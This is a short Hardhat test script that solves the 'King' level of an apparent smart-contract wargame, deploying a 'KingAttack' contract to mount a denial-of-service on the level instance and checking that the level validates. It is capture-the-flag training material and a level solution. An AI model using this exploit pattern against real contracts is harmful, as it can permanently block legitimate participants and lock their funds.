const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("King", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("King", player.address, ethers.utils.parseEther("0.001"));
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Basic DoS attack
        // May be prevented by implementing the withdrawal desing pattern
        const attacker = await (await ethers.getContractFactory("KingAttack")).deploy();
        await attacker.attack(instance.address, { value: ethers.utils.parseEther("0.001") });
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});